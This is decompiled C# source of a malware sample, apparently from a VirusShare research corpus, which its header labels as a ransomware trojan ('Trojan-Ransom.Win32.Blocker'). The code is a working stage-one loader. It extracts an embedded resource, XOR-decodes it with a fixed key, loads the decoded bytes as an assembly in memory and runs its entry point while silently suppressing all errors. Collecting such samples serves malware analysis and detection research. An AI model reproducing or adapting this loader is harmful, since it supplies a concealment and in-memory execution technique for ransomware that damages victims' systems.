// Decompiled with JetBrains decompiler
// Type: obj
// Assembly: PiL, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 080DEF98-ACC3-4E31-8D71-0BFA1C815921
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.fbgc-c16aec67858284d94c1334be74b5badbd7e39b3c14773f6a4c0a961c5f655d2e.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;

public class obj
{
  public static void objO(object objObj)
  {
    try
    {
      Assembly.Load((byte[]) objObj).EntryPoint.Invoke((object) null, (object[]) null);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void objRB(byte[] objD)
  {
    try
    {
      Thread thread = new Thread(new ParameterizedThreadStart(obj.objO));
      thread.SetApartmentState(ApartmentState.STA);
      thread.Start((object) objD);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static object objNothing => (object) null;

  public static byte[] EGA(string Inp)
  {
    byte[] numArray;
    try
    {
      Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(Inp);
      int length = checked ((int) manifestResourceStream.Length);
      byte[] buffer = new byte[checked (length - 1 + 1)];
      numArray = new MemoryStream(buffer, 0, manifestResourceStream.Read(buffer, 0, length)).ToArray();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      numArray = (byte[]) null;
      ProjectData.ClearProjectError();
    }
    return numArray;
  }

  public static int ZeroInt => 0;

  public static void objNE()
  {
  }

  public static byte[] objBytes() => Encoding.Default.GetBytes(obj.objX(Encoding.Default.GetString(obj.EGA("_res32.resources")), 239));

  public static string objX(string objTTE, int objK)
  {
    string str;
    try
    {
      StringBuilder stringBuilder1 = new StringBuilder(objTTE);
      StringBuilder stringBuilder2 = new StringBuilder(objTTE.Length);
      int num = checked (objTTE.Length - 1);
      int index = 0;
      while (index <= num)
      {
        char ch = Strings.Chr(Strings.Asc(stringBuilder1[index]) ^ objK);
        stringBuilder2.Append(ch);
        checked { ++index; }
      }
      str = stringBuilder2.ToString();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str = (string) null;
      ProjectData.ClearProjectError();
    }
    return str;
  }

  [STAThread]
  public static void Main()
  {
    try
    {
      new Thread(new ThreadStart(obj.objNE))
      {
        IsBackground = true
      }.Start();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      obj.objRB(obj.objBytes());
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    Process.GetCurrentProcess().WaitForExit();
  }
}
